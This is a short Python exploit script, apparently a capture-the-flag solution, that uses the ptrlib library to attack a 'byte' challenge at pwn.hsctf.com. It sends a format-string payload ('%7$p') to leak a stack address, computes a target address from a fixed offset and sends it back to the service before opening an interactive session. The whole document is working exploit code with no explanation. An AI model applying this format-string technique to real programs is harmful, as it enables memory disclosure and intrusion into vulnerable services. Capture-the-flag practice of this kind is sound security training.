from ptrlib import *

#sock = Process("./byte")
sock = Socket("pwn.hsctf.com", 6666)

sock.recvuntil("byte: ")
sock.sendline("%7$p")
addr_stack = int(sock.recvuntil(" "), 16)
addr_target = addr_stack - 314
logger.info("target = " + hex(addr_target))

sock.recvuntil("byte: ")
sock.sendline(hex(addr_target)[2:])

sock.interactive()
